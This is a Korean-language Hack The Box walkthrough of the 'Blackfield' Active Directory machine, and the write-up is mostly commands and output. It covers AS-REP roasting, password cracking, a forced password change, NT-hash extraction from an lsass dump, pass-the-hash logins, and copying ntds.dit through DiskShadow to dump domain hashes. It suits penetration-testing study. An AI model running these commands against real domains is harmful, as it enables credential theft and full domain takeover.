# HTB — Blackfield

**OS:** Windows (Server 2019) **Difficulty:** Hard **IP:** 10.129.229.17 **Tags:** `active-directory` `as-rep-roasting` `bloodhound` `ForceChangePassword` `SeBackupPrivilege` `lsass-dump` `ntds-dit` `diskshadow`

---

## Summary

Blackfield는 RID brute forcing으로 유저 목록을 수집하고 AS-REP Roasting으로 support 계정을 획득한다. BloodHound 분석으로 support → audit2020 ForceChangePassword 권한을 발견하고, forensic SMB 공유의 lsass 덤프에서 svc_backup 해시를 추출한다. SeBackupPrivilege를 이용해 DiskShadow로 ntds.dit를 추출하고 Administrator 해시로 root를 획득하는 Hard 머신이다.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 10000 10.129.229.17
```

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman (WinRM)
```

### 도메인 정보 확인

```bash
crackmapexec smb 10.129.229.17
# domain: BLACKFIELD.local, DC: DC01
```

---

## Enumeration

### 유저 목록 수집 (RID Brute Force)

```bash
crackmapexec smb 10.129.229.17 -u guest -p '' --rid-brute 2>/dev/null | grep SidTypeUser | grep -v '\$' | awk '{print $6}' | cut -d'\' -f2 > users.txt
```

주요 계정: support, audit2020, svc_backup 등

---

## Exploitation

### AS-REP Roasting

```bash
impacket-GetNPUsers BLACKFIELD.local/ -no-pass -usersfile users.txt -dc-ip 10.129.229.17
```

**support** 유저 AS-REP 해시 획득:

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:...
```

### 해시 크랙

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# support : #00^BlackKnight
```

---

## BloodHound 분석

```bash
bloodhound-python -u support -p '#00^BlackKnight' -d BLACKFIELD.local -dc DC01.BLACKFIELD.local -ns 10.129.229.17 -c all
```

BloodHound에서 발견:

- **support → AUDIT2020: ForceChangePassword** 권한

### audit2020 패스워드 강제 변경

```bash
rpcclient -U "support%#00^BlackKnight" 10.129.229.17
setuserinfo2 audit2020 23 'NewPass123!'
exit
```

---

## Lateral Movement (audit2020 → svc_backup)

### forensic 공유 접근

```bash
smbclient -L //10.129.229.17 -U 'BLACKFIELD.local/audit2020%NewPass123!'
# forensic 공유 발견

impacket-smbclient 'BLACKFIELD.local/audit2020:NewPass123!@10.129.229.17'
# use forensic
# cd memory_analysis
# get lsass.zip
```

### lsass 덤프 분석

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

**svc_backup NT 해시 획득:**

```
Username: svc_backup
NT: 9658d1d1dcd9250115e2205d9f48400d
```

### WinRM 접속 (svc_backup)

```bash
evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

---

## User Flag

```bash
type C:\Users\svc_backup\Desktop\user.txt
# 3920bb317a0bef51027e2852be64b543
```

---

## Privilege Escalation

### 권한 확인

```bash
whoami /priv
# SeBackupPrivilege — Enabled
# SeRestorePrivilege — Enabled
```

### DiskShadow으로 ntds.dit 추출

> ⚠️ SAM에서 추출한 Administrator 해시는 로컬 해시라 도메인 인증에 사용 불가. ntds.dit에서 도메인 해시를 추출해야 함.

**Kali에서 dsh 파일 생성:**

```bash
cat > test.dsh << 'EOF'
set context persistent nowriters
add volume c: alias mq
create
expose %mq% z:
EOF
unix2dos test.dsh
```

**evil-winrm에서:**

```bash
mkdir C:\Temp
cd C:\Temp
upload test.dsh
diskshadow /s test.dsh
robocopy /b z:\windows\ntds . ntds.dit
cmd /c "reg save HKLM\SYSTEM C:\Temp\SYSTEM"
download ntds.dit
download SYSTEM
```

### 해시 추출

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

### Administrator 접속

```bash
evil-winrm -i 10.129.229.17 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

---

## Root Flag

```bash
type C:\Users\Administrator\Desktop\root.txt
# 4375a629c7c67c8e29db269060c955cb
```

---

## Attack Chain

```
Port Scan
  → RID Brute Force → 유저 목록
    → AS-REP Roasting → support 해시 크랙
      → BloodHound → support→audit2020 ForceChangePassword
        → rpcclient 패스워드 변경
          → forensic SMB → lsass.zip → svc_backup NT 해시
            → evil-winrm (svc_backup) → user flag
              → SeBackupPrivilege → DiskShadow → ntds.dit
                → impacket-secretsdump → Administrator 해시
                  → evil-winrm (Administrator) → root flag
```

---

## Key Takeaways

- **AS-REP Roasting**: `UF_DONT_REQUIRE_PREAUTH` 설정된 계정은 인증 없이 TGT 요청 가능 → 오프라인 크랙.
- **BloodHound ForceChangePassword**: 타 계정 패스워드 강제 변경 권한. `rpcclient setuserinfo2`로 악용.
- **lsass 덤프 분석**: forensic 공유에 lsass 덤프가 있으면 pypykatz로 NT 해시 추출 가능.
- **SAM vs ntds.dit**: SAM의 Administrator 해시는 로컬 계정 해시. 도메인 Administrator 해시는 ntds.dit에서 추출해야 함.
- **DiskShadow**: SeBackupPrivilege로 VSS 스냅샷 생성 후 잠긴 ntds.dit 파일 복사 가능. `unix2dos`로 dsh 파일 변환 필수.
- **evil-winrm download 팁**: 큰 파일은 해당 디렉토리로 `cd` 후 파일명만 지정해야 동작.